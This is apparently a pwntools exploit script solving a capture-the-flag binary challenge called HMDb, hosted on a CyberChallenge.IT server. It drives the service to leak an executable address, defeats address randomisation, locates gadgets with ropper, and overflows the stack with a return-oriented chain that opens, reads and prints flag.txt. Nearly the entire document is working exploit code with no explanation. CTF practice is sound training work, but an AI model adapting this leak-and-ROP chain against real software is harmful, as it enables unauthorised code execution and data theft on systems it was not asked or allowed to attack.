from shutil import copyfile

from pwn import *
from ropper import RopperService

options = {
    'color': False,
    'badbytes': '0a',
    'all': False,
    'inst_count': 6,
    'type': 'all',
    'detailed': False,
}

rs = RopperService(options)
exe = ELF("HMDb.sym.elf")
context.binary = exe
HOST = "hmdb.challs.cyberchallenge.it"
PORT = 9219
p = remote(HOST, PORT)
offset = 5856
rbp_offset = 56


def search_gadget(exact, search):
    if exact == "ret":
        g = list(rs.search(search="ret"))[-1][1]
        log.info(f"Found gadget {g._gadget} for {exact}")
        return g.address
    for f, gadget in rs.search(search=search):
        if exact in gadget._gadget:
            log.info(f"Found gadget {gadget._gadget} for {exact}")
            return gadget.address
    log.error(f"Gadget not found for exact {exact} with search {search}")


def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def increase_size():
    p.recvuntil(b"quit")
    p.sendline(b"details 13")
    size = 10
    for i in range(size):
        p.recvuntil(b">")
        p.sendline(b"details 13")


def print_details(i):
    retval = p.recvuntil(b">")
    p.sendline(f"details {i}")
    return retval


def leak_exe_addr():
    print_details(26)
    p.recvuntil(b"Hacktivists")
    addr = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success(f"address --> {addr:#08x}")
    exe.address = addr - offset
    log.success(f"exe addr --> {exe.address:#08x}")


def find_gadgets():
    from os import system

    copyfile("HMDb", "HMDb.bak")
    rs.addFile("HMDb.bak")
    rs.setImageBaseFor("HMDb.bak", exe.address)
    rs.loadGadgetsFor()
    gadgets = dict()
    gadgets["POP_RDI"] = search_gadget("pop rdi; ret;", "pop rdi")
    gadgets["POP_RSI_POP_R15"] = search_gadget("pop rsi; pop r15; ret;", "pop rsi")
    gadgets["ADD_RSP_8"] = search_gadget("add rsp, 8; ret;", "add rsp")
    gadgets["NOP"] = search_gadget("ret", "ret")
    system("rm HMDb.bak")
    return gadgets


def print_flag(gadgets):
    payload = dict()

    bufferone = exe.bss(300)
    bufferone2 = exe.bss(400)
    chain = [
        exe.sym.help_command,
        gadg["POP_RDI"],
        0,
        gadg["POP_RSI_POP_R15"],
        bufferone,
        0,
        exe.sym.read,
        exe.sym.stampa_film,
        gadg["POP_RDI"],
        bufferone,
        gadg["POP_RSI_POP_R15"],
        0,
        0,
        exe.sym.open,
        exe.sym.help_command,
        gadg["POP_RDI"],
        3,
        gadg["POP_RSI_POP_R15"],
        bufferone2,
        0,
        exe.sym.read,
        gadg["POP_RDI"],
        1,
        gadg["POP_RSI_POP_R15"],
        bufferone2,
        0,
        exe.sym.write,
        gadg["POP_RDI"],
        0,
        exe.sym.exit,
    ]
    payload[rbp_offset] = chain

    payload = fit(payload)
    p.recvuntil(">")
    p.sendline(payload)
    p.recvuntil(">")
    p.sendline("quit")
    p.recvuntil("quit")
    p.sendline(b"flag.txt\x00")
    p.recvuntil("quit")
    flag = p.recvuntil("}").strip().replace(b"\x00", b"").decode()
    log.success("Flag --> %s" % flag)


increase_size()
leak_exe_addr()
gadg = find_gadgets()
print_flag(gadg)
